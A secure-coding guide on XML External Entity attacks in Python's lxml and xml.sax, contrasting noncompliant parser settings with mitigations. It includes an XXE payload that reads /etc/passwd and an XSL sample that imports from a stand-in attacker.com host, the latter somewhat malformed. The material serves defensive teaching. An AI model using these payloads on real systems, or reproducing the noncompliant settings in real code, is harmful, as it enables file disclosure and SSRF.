# XML External Entities (XXE)

## Description
XML specification allows the use of entities that can be internal or external (file system / network access ...) which could lead to vulnerabilities such as confidential file disclosures or SSRFs.

Example in this XML document, an external entity read the /etc/passwd file:

```python
<?xml version="1.0" encoding="utf-8"?>
  <!DOCTYPE test [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ]>
<note xmlns="http://www.w3schools.com" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
  <to>&xxe;</to>
  <from>Jani</from>
  <heading>Reminder</heading>
  <body>Don't forget me this weekend!</body>
</note>
```

In this XSL document, network access is allowed which can lead to SSRF vulnerabilities:

```python
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.attacker.com/evil.xsl">
  <xsl:import href="http://www.attacker.com/evil.xsl"/>
  <xsl:include href="http://www.attacker.com/evil.xsl"/>
 <xsl:template match="/">
  &content;
 </xsl:template>
</xsl:stylesheet>
```
It is recommended to disable access to external entities and network access in general.


## Vulnerable Code Example
lxml module:

* When parsing XML:

```python
parser = etree.XMLParser() # Noncompliant: by default resolve_entities is set to true
tree1 = etree.parse('ressources/xxe.xml', parser)
root1 = tree1.getroot()

parser = etree.XMLParser(resolve_entities=True) # Noncompliant
tree1 = etree.parse('ressources/xxe.xml', parser)
root1 = tree1.getroot()
```
* When validating XML:

```python
parser = etree.XMLParser(resolve_entities=True) # Noncompliant
treexsd = etree.parse('ressources/xxe.xsd', parser)
rootxsd = treexsd.getroot()
schema = etree.XMLSchema(rootxsd)
```
* When transforming XML:

```python
ac = etree.XSLTAccessControl(read_network=True, write_network=False)  # Noncompliant, read_network is set to true/network access is authorized
transform = etree.XSLT(rootxsl, access_control=ac)
```

## Mitigation
lxml module:

* When parsing XML, disable resolveentities_ and network access:

```python
parser = etree.XMLParser(resolve_entities=False, no_network=True) # Compliant
tree1 = etree.parse('ressources/xxe.xml', parser)
root1 = tree1.getroot()
```
* When validating XML (note that network access cannot be completely disabled when calling XMLSchema):

```python
parser = etree.XMLParser(resolve_entities=False) # Compliant: by default no_network is set to true
treexsd = etree.parse('ressources/xxe.xsd', parser)
rootxsd = treexsd.getroot()
schema = etree.XMLSchema(rootxsd) # Compliant
```
* When transforming XML, disable access to network and file system:
```python
parser = etree.XMLParser(resolve_entities=False) # Compliant
treexsl = etree.parse('ressources/xxe.xsl', parser)
rootxsl = treexsl.getroot()

ac = etree.XSLTAccessControl.DENY_ALL  # Compliant
transform = etree.XSLT(rootxsl, access_control=ac) # Compliant
```
* To prevent xxe attacks with xml.sax module (for other security reasons than XXE, xml.sax is not recommended):

```python
parser = xml.sax.make_parser()
myHandler = MyHandler()
parser.setContentHandler(myHandler)
parser.parse("ressources/xxe.xml") # Compliant: in version 3.7.1: The SAX parser no longer processes general external entities by default

parser.setFeature(feature_external_ges, False) # Compliant
parser.parse("ressources/xxe.xml")
```

## Risk Assessment

## References
* [A4:2017-XML External Entities (XXE)]
* [XML External Entity Prevention Cheat Sheet]
* [CWE-611: Improper Restriction of XML External Entity Reference]
* [CWE-827: Improper Control of Document Type Definition]

[A4:2017-XML External Entities (XXE)]:https://owasp.org/www-project-top-ten/2017/A4_2017-XML_External_Entities_(XXE).html
[XML External Entity Prevention Cheat Sheet]:https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
[CWE-611: Improper Restriction of XML External Entity Reference]:https://cwe.mitre.org/data/definitions/611.html
[CWE-827: Improper Control of Document Type Definition]:https://cwe.mitre.org/data/definitions/827.html



